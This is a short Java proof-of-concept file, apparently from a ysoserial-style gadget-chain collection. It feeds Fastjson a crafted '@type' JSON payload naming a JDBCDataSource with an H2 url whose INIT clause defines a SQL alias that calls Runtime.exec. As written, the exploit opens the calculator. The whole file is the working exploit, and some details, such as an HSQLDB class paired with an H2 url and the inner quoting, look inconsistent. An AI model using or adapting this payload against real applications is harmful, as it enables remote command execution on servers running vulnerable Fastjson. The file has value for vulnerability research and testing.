package ysoserial.payloads.tabbyGadgetChains.tomcat;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc3 {
    public static void main(String[] args) {
//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc = "{\"@type\":\"org.hsqldb.jdbc.JDBCDataSource\", \"url\":\"jdbc:h2:mem:test;MODE=MSSQLServer;INIT=drop alias if exists exec\\\\;CREATE ALIAS EXEC AS 'void exec() throws java.io.IOException { Runtime.getRuntime().exec(\"open -a calculator.app\")\\\\; }'\\\\;CALL EXEC ()\\\\;\"}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
